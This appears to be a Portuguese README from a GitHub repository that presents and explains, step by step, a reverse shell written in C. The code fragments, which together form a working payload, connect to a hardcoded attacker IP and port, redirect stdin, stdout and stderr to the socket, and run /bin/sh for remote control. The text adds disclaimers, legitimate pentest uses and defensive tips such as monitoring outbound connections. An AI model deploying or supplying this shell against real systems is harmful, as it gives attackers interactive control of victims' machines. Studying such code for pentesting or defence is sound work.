# 🐚 C Reverse Shell 

Este rep1ositório contém um código de **shell reverso escrito em linguagem C**, ideal para fins educacionais, CTFs e testes de segurança autorizados.

---

## ⚠️ AVISO IMPORTANTE

Este código é **potencialmente perigoso** e pode ser utilizado de forma maliciosa. No entanto, ele também tem **aplicações legítimas** em testes de intrusão (pentest), auditorias de segurança e simulações ofensivas.

> ❗ **Nunca utilize este tipo de código em sistemas sem permissão explícita.**
> O uso indevido pode violar leis locais e internacionais.
> O autor **não se responsabiliza** por qualquer dano ou uso indevido.

---

## 🔍 O que o código faz — Explicado passo a passo

Este código é um shell reverso escrito em C. Quando executado, ele instrui a máquina (vítima) a se conectar de volta ao atacante, oferecendo um terminal interativo com os mesmos privilégios do usuário que executou o programa.

---

### 1. Definições iniciais

```c
#define REMOTE_ADDR "192.168.0.5"
#define REMOTE_PORT 1337
```

- Define o IP e a porta do atacante.  
- O código tentará conectar-se a esse IP/porta usando TCP.

---

### 2. Estrutura do socket

```c
struct sockaddr_in sa;
sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
sa.sin_port = htons(REMOTE_PORT);
```

- Define o tipo de conexão (IPv4), IP de destino e porta de destino.

---

### 3. Criação e conexão do socket

```c
s = socket(AF_INET, SOCK_STREAM, 0);
connect(s, (struct sockaddr *)&sa, sizeof(sa));
```

- Cria um socket TCP e conecta ao servidor remoto (máquina atacante).

---

### 4. Redirecionamento de I/O

```c
dup2(s, 0);
dup2(s, 1);
dup2(s, 2);
```

- Redireciona entrada, saída e erro padrão para o socket:
  - stdin → socket
  - stdout → socket
  - stderr → socket

---

### 5. Execução da shell remota

```c
execve("/bin/sh", NULL, NULL);
```

- Inicia um shell interativo (`/bin/sh`) com entrada/saída ligada ao socket TCP.
- O atacante poderá interagir com a shell remotamente.

---

## ✅ Exemplos de uso legítimo

- Testes de segurança (pentest) com permissão do cliente.
- Simulações de ataque para avaliar defesa de sistemas.
- Análises forenses, educativas ou ambientes CTF.

---

## 💡 Conclusão Técnica

Este programa:

- Estabelece uma conexão reversa TCP com o atacante.
- Redireciona os descritores padrão (0, 1, 2) para o socket.
- Executa uma shell interativa com controle remoto total.
- Simples, eficaz e muito usado em exploits ou pós-exploração.

---

## 🛡️ Proteção recomendada

Para evitar que códigos como este sejam executados, algumas boas práticas incluem:

- Restringir compiladores em servidores.
- Monitorar conexões de saída.
- Usar firewalls para impedir conexões reversas suspeitas.
- Analisar uso de `execve`, `dup2`, `socket`, etc., com ferramentas de segurança.

---

## 👨‍💻 Autor

- [r0daemon](https://github.com/0daemon)

---

## 📄 Licença

Distribuído sob a [GNU GPL v3](https://www.gnu.org/licenses/old-licenses/gpl-3.0.html).
